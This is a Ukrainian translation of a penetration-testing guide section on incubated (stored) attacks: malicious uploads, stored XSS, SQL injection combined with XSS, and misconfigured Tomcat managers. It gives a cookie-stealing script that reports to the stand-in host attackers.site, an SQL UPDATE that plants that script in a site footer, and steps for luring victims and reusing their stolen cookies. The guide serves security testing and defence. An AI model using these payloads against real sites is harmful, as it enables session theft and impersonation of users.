# Резюме
Інкубаційне тестування, яке також часто називають постійними атаками, є складним методом тестування, для роботи якого потрібно більше однієї вразливості перевірки даних. Інкубовані вразливості зазвичай використовуються для здійснення атак "водопою" проти користувачів законних веб-додатків.

Інкубовані вразливості мають наступні характеристики:

- Вектор атаки повинен бути збережений в першу чергу, він повинен бути збережений на рівні збереження, і це сталося б лише в тому випадку, якщо була присутня слабка перевірка даних або дані надходили в систему через інший канал, такий як консоль адміністратора або безпосередньо через серверний пакетний процес.
- По-друге, як тільки вектор атаки був "відкликаний", вектор повинен був бути успішно виконаний. Наприклад, інкубована атака XSS вимагала б слабкої перевірки результатів, щоб скрипт був доставлений Клієнту у його виконуваній формі.

Використання деяких вразливостей або навіть функціональних можливостей веб-програми дозволить зловмиснику впровадити частину даних, які пізніше будуть вилучені нічого не підозрюючим користувачем або іншим компонентом системи, використовуючи деяку вразливість там.

У тесті на проникнення `інкубовані атаки` можуть бути використані для оцінки критичності певних помилок, використовуючи конкретну виявлену проблему безпеки для створення атаки на стороні клієнта, яка зазвичай буде використовуватися для одночасного впливу на велику кількість жертв (тобто на всіх користувачів, які переглядають сайт).

Цей тип асинхронної атаки охоплює широкий спектр векторів атаки, серед яких наступні:

- Компоненти завантаження файлів у веб-додатку, що дозволяють зловмиснику завантажувати пошкоджені медіафайли (зображення у форматі JPEG, що використовують `CVE-2004-0200`, зображення у форматі PNG, що використовують `CVE-2004-0597`, виконувані файли, сторінки сайту з активним компонентом і т. д.)
- Проблеми з міжсайтовим скриптингом в повідомленнях на загальнодоступних форумах (додаткові відомості див.в розділі тестування збережених міжсайтових скриптів). Зловмисник потенційно може зберігати шкідливі скрипти або код в репозиторії в серверній частині веб-додатки (наприклад, в базі даних), щоб цей скрипт/код виконувався одним з користувачів (кінцевими користувачами, адміністраторами і т.д.). Прикладом архетипічних інкубували атаки є використання уразливості міжсайтового скриптинга на форумі користувача, дошці оголошень або блозі для впровадження деякого коду JavaScript на вразливу сторінку, який в кінцевому підсумку буде відображений і виконаний в браузері користувача сайту – з використанням рівня довіри вихідного (уразливого) сайт в браузері користувача.
- Введення SQL / XPATH, що дозволяє зловмиснику завантажувати вміст у базу даних, яка згодом буде вилучена як частина активного вмісту веб-сторінки. Наприклад, якщо зловмисник може розмістити довільний JavaScript на дошці оголошень, щоб він виконувався користувачами, тоді він може отримати контроль над їх браузерами (наприклад, XSS-proxy).
- Неправильно налаштовані сервери, що дозволяють встановлювати пакети Java або подібні компоненти веб-сайту (наприклад, Tomcat або консолі веб-хостингу, такі як Plesk, cPanel, Helm тощо)
# Цілі тестування
- Визначте ін'єкції, які зберігаються і вимагають кроку відкликання збереженої ін'єкції.
- Зрозумійте, як може відбутися етап відкликання.
- Встановіть слухачі або активуйте крок відкликання, якщо це можливо.

## Як протестувати
## Тестування "чорного ящика"
### Приклад завантаження файлу
Перевірте тип вмісту, дозволений для завантаження у веб-програму, та отриману URL-адресу для завантаженого файлу. Завантажте файл, який використовуватиме компонент на локальній робочій станції користувача під час перегляду або завантаження Користувачем. Надішліть своїй жертві електронний лист або інший вид попередження, щоб заохотити його / її переглянути сторінку. Очікуваний результат полягає в тому, що експлойт буде запущений, коли користувач переглядає отриману сторінку або завантажує та виконує файл із надійного сайту.

## Приклад XSS на дошці оголошень
1. Introduce JavaScript code as the value for the vulnerable field, for instance `<script>document.write('<img src="http://attackers.site/cv.jpg?'+document.cookie+'">')</script>`
2. Direct users to browse the vulnerable page or wait for the users to browse it. Have a “listener” at attackers.site host listening for all incoming connections.
3. When users browse the vulnerable page, a request containing their cookie (document.cookie is included as part of the requested URL) will be sent to the attackers.site host, such as: GET /cv.jpg?SignOn=COOKIEVALUE1;%20ASPSESSIONID=ROGUEIDVALUE; HTTP/1.1
4. Use cookies obtained to impersonate users at the vulnerable site.

## Приклад SQL-ін'єкції
Зазвичай у цьому наборі прикладів використовуються атаки XSS, які використовують вразливість ін'єкції SQL. Перше, що потрібно перевірити, - це наявність на цільовому сайті вразливості для ін'єкцій SQL. Це описано в розділі тестування на SQL-ін'єкцію. Для кожної вразливості ін'єкції SQL існує базовий набір обмежень, що описують тип запитів, які дозволено виконувати зловмиснику / тестувальнику пера.

Потім тестер повинен зіставити розроблені ним атаки XSS із записами, які йому дозволено вставляти.

Подібним чином, як і в попередньому прикладі XSS, використовуйте поле веб-сторінки, вразливе до проблем із введенням SQL, щоб змінити значення в базі даних, яке буде використовуватися додатком як Вхід для відображення на сайті без належної фільтрації (це буде комбінація SQL-ін'єкції та проблеми з XSS). Наприклад, припустимо, що в базі даних є таблиця нижнього колонтитула з усіма нижніми колонтитулами для сторінок веб-сайту, включаючи поле сповіщення з юридичним повідомленням, яке з'являється внизу кожної веб-сторінки. Ви можете використовувати наступний запит, щоб ввести код JavaScript у поле сповіщення в таблиці нижнього колонтитула в базі даних.
```sql
SELECT field1, field2, field3
FROM table_x
WHERE field2 = 'x';
   UPDATE footer
   SET notice = 'Copyright 1999-2030%20
       <script>document.write(\'<img src="http://attackers.site/cv.jpg?\'+document.cookie+\'">\')</script>'
   WHERE notice = 'Copyright 1999-2030';
````
Тепер кожен користувач, який переглядає сайт, буде мовчки відправляти свої файли cookie зловмисникам.site.

## Неправильно налаштований сервер
Деякі веб-сервери надають інтерфейс адміністрування, який може дозволити зловмиснику завантажувати на сайт Активні компоненти на свій вибір. Це може бути у випадку з сервером Apache Tomcat, який не застосовує надійні облікові дані для доступу до свого менеджера веб-додатків (або якщо тестери pen змогли отримати дійсні облікові дані для модуля адміністрування іншими способами).

У цьому випадку може бути завантажений файл WAR і на сайті розгорнуто нову веб-програму, яка не тільки дозволить тестувальнику пера виконувати код за своїм вибором локально на сервері, але і встановити додаток на довіреному сайті, до якого потім зможуть отримати доступ звичайні користувачі сайту (більшість ймовірно, з більш високим ступенем довіри, ніж при доступі до іншого сайту).

Також має бути очевидно, що можливість змінювати вміст веб-сторінки на сервері за допомогою будь-яких недоліків, які можуть бути використані на хості, що дасть зловмиснику права на запис у webroot, також буде корисна для впровадження такої інкубували атаки на сторінки веб-сервера (насправді, це відома інфекція -метод розповсюдження для деяких черв'яків веб-сервера).

## Тестування Grey Box
Методи тестування "сірого ящика" або "білого ящика" будуть такими ж, як обговорювалося раніше.

- Перевірка правильності вхідних даних є ключовим фактором для усунення цієї вразливості. Якщо інші системи на підприємстві використовують той самий рівень збереження, вони можуть мати слабку перевірку вхідних даних, і дані можуть зберігатися через задні двері.
- Для боротьби з проблемою бекдора при атаках на стороні клієнта також необхідно використовувати перевірку вихідних даних, щоб зіпсовані дані були закодовані перед відображенням клієнту і, отже, не виконувалися.